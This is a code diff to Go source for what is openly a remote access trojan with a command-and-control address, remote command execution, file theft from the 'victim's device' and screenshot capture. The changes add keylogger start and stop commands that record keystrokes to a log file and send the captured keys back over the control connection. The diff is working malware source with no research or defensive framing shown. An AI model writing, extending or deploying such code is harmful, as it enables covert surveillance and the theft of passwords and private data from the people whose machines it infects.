@@ -25,6 +25,11 @@ const (
 	C2 string = "127.0.0.1:54321"
 )
 
+var (
+	keylog_flag int = 0
+	logfile string = "logs.txt"
+)
+
 func main() {
 	conn, _ := connect_home()
 
@@ -69,6 +74,13 @@ func main() {
 			tgt_file := strings.Split(cmd, " ")[1]
 			result := get_file(tgt_file)
 			send_resp(conn, result)
+		} else if cmd == "keylog_start" {
+			keylog_flag = 1
+			go log_keystrokes()
+			send_resp(conn, "Keylogger started successfully")
+		} else if cmd == "keylog_stop" { 
+			keylog_flag = 0
+			send_resp(conn, dump_keystroke_logs())
 		} else {
 			send_resp(conn, exec_cmd(cmd))
 		}
@@ -118,6 +130,12 @@ func file_exists(file string) (bool) {
 	}
 }
 
+// read a file and return base64 encoding of its contents
+func file_b64(file string) (string) {
+	content, _ := os.ReadFile(file)
+	return b64.StdEncoding.EncodeToString(content)
+}
+
 // return the base64 encoding of a file on victim's device
 func get_file(file string) (string) {
 	if !file_exists(file) {
@@ -151,25 +169,25 @@ func take_screenshot() (string) {
 	return b64_string
 }
 
-// log keystrokes
-func log_keystrokes() (string, string) {
+// log keystrokes for a specific amount of time
+func log_keystrokes() {
 	keyboard := keylogger.FindKeyboardDevice()
+	os.Create(logfile)
+	file, _ := os.OpenFile(logfile, os.O_APPEND, 0644)
 	if len(keyboard) <= 0 {
-		return "", "No keyboard found"
+		file.WriteString("No keyboard found :(")
 	}
 	if k, err := keylogger.New(keyboard); err != nil {
-		return "", err.Error()
+		file.WriteString(err.Error())
 	} else {
-		logs := ""
 		events := k.Read()
 		for e := range events {
 			switch e.Type {
 			case keylogger.EvKey:
 				if e.KeyRelease() {
-					logs += e.KeyString()
+					file.WriteString(e.KeyString())
 				}
 			}
 		}
-		return logs, ""
 	}
 }
